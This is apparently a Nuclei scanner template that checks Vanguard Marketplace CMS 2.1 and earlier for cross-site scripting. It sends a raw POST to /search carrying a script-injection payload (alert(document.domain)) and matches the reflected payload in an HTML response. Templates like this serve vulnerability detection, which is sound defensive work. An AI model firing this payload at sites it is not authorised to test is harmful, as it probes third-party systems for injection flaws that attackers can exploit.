id: vanguard-post-xss
info:
  author: ImNightmaree
  description: Persistent Cross-site Scripting in message & product title-tags also
    there's Non-Persistent Cross-site scripting in product search box
  name: "Vanguard Marketplace CMS \u2264 2.1"
  reference:
  - https://packetstormsecurity.com/files/157099/Vanguard-2.1-Cross-Site-Scripting.html
  severity: medium
  tags: vanguard,xss
requests:
- matchers:
  - part: body
    type: word
    words:
    - </script><script>alert(document.domain)</script>
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /search HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    phps_query=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

    '
